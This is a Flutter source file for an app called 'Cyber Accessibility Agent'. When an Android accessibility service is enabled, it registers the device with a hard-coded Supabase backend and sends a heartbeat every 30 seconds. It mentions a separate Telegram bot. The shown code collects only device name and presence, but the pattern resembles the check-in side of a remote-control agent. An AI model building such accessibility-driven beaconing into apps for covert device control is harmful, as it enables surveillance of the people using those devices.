// lib/main.dart
import 'dart:async';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

/// CONFIG — replace with your project values (anon key ok; do NOT use service_role)
const int HEARTBEAT_INTERVAL_SECONDS = 30;
const String SUPABASE_PROJECT_URL = 'https://pbovhvhpewnooofaeybe.supabase.co';
const String SUPABASE_ANON_KEY = 'sb_publishable_3ogCBf5gvYZqIA7074Tz2A_64hEs13h';

/// Recommended: point to an Edge Function that uses service_role on the server side.
/// If you don't have it, the client will attempt the REST fallback (requires RLS rules).
const String SUPABASE_REGISTER_FUNCTION = '$SUPABASE_PROJECT_URL/functions/v1/register-device';

final MethodChannel _chan = const MethodChannel('accessibility_bridge');

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const CyberAgentApp());
}

class CyberAgentApp extends StatelessWidget {
  const CyberAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Cyber Accessibility Agent',
      debugShowCheckedModeBanner: false,
      home: const ConsentPage(),
    );
  }
}

class ConsentPage extends StatefulWidget {
  const ConsentPage({super.key});

  @override
  State<ConsentPage> createState() => _ConsentPageState();
}

class _ConsentPageState extends State<ConsentPage> {
  String _status = 'Waiting for accessibility to be enabled...';
  Timer? _heartbeatTimer;
  String? _deviceId;
  SharedPreferences? _prefs;

  @override
  void initState() {
    super.initState();
    // register the platform channel handler immediately so we don't miss the broadcast
    _chan.setMethodCallHandler(_platformHandler);
    _initPrefs();
  }

  Future<void> _initPrefs() async {
    _prefs = await SharedPreferences.getInstance();
    _deviceId = _prefs?.getString('device_id');
    if (_deviceId == null) {
      _deviceId = const Uuid().v4();
      await _prefs?.setString('device_id', _deviceId!);
    }
  }

  Future<dynamic> _platformHandler(MethodCall call) async {
    // Called by native when Accessibility service connects
    if (call.method == 'accessibility_enabled') {
      final args = call.arguments as Map? ?? {};
      final model = (args['model'] ?? '').toString();
      final manufacturer = (args['manufacturer'] ?? '').toString();
      final displayName = ((manufacturer.isNotEmpty ? '$manufacturer ' : '') + model).trim();
      setState(() => _status = 'Accessibility enabled on ${displayName.isNotEmpty ? displayName : "device"}');

      // register device (edge function preferred)
      await _registerDevice(displayName: displayName.isNotEmpty ? displayName : 'Android Device');

      // start heartbeat to update last_seen
      _startHeartbeat();
    }
    return null;
  }

  Future<void> _registerDevice({required String displayName}) async {
    try {
      if (_deviceId == null) await _initPrefs();
      final deviceId = _deviceId!;

      // 1) Try Edge Function (recommended)
      try {
        final efUri = Uri.parse(SUPABASE_REGISTER_FUNCTION);
        final efBody = jsonEncode({
          'requestedId': deviceId,
          'displayName': displayName,
          'consent': true,
          'metadata': {'registered_from': 'apk'}
        });

        final efResp = await http.post(efUri, headers: {
          'Content-Type': 'application/json',
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': 'Bearer $SUPABASE_ANON_KEY',
        }, body: efBody);

        if (efResp.statusCode >= 200 && efResp.statusCode < 300) {
          setState(() => _status = 'Device registered (via edge function)');
          return;
        } else {
          // continue to fallback; log for debugging
          debugPrint('Edge function responded ${efResp.statusCode}: ${efResp.body}');
        }
      } catch (e) {
        debugPrint('Edge function call failed: $e');
      }

      // 2) Fallback: direct REST upsert (requires anon key & RLS configured appropriately)
      try {
        final restUri = Uri.parse('$SUPABASE_PROJECT_URL/rest/v1/devices');
        final restBody = jsonEncode({
          'id': deviceId,
          'display_name': displayName,
          'online': true,
          'consent': true,
          'enabled': true,
          'metadata': {'registered_from': 'apk'}
        });

        final restResp = await http.post(restUri, headers: {
          'Content-Type': 'application/json',
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': 'Bearer $SUPABASE_ANON_KEY',
          'Prefer': 'return=representation, resolution=merge-duplicates'
        }, body: restBody);

        if (restResp.statusCode >= 200 && restResp.statusCode < 300) {
          setState(() => _status = 'Device registered (fallback REST)');
          return;
        } else {
          debugPrint('REST upsert failed ${restResp.statusCode}: ${restResp.body}');
        }
      } catch (e) {
        debugPrint('REST fallback failed: $e');
      }

      setState(() => _status = 'Register failed (see logs)');
    } catch (e) {
      setState(() => _status = 'Register exception: $e');
      debugPrint('registerDevice exception: $e');
    }
  }

  void _startHeartbeat() {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = Timer.periodic(const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS), (_) async {
      try {
        if (_deviceId == null) return;
        final uri = Uri.parse('$SUPABASE_PROJECT_URL/rest/v1/devices');
        final body = jsonEncode({
          'id': _deviceId,
          'last_seen': DateTime.now().toUtc().toIso8601String(),
          'online': true
        });
        final resp = await http.post(uri, headers: {
          'Content-Type': 'application/json',
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': 'Bearer $SUPABASE_ANON_KEY',
          'Prefer': 'resolution=merge-duplicates'
        }, body: body);

        if (resp.statusCode >= 200 && resp.statusCode < 300) {
          // ok
          debugPrint('heartbeat ok');
        } else {
          debugPrint('heartbeat failed ${resp.statusCode}: ${resp.body}');
        }
      } catch (e) {
        debugPrint('heartbeat exception: $e');
      }
    });
  }

  @override
  void dispose() {
    _heartbeatTimer?.cancel();
    // remove method call handler to avoid leaks
    _chan.setMethodCallHandler(null);
    super.dispose();
  }

  // Small helper to allow manual registration from UI for testing
  Future<void> _manualRegister() async {
    await _registerDevice(displayName: 'Manual Register');
    _startHeartbeat();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Accessibility Agent')),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(_status),
            const SizedBox(height: 12),
            const Text('Make sure you enabled Accessibility service in Settings.'),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: _manualRegister,
              child: const Text('Manual register (test)'),
            ),
            const SizedBox(height: 8),
            const Text(
              'Notes:\n- This APK does NOT include Telegram bot code.\n- Registration uses an Edge Function if configured, otherwise attempts REST upsert (anon key must be allowed by RLS).\n- Do NOT include service_role key in APK.',
            ),
          ],
        ),
      ),
    );
  }
}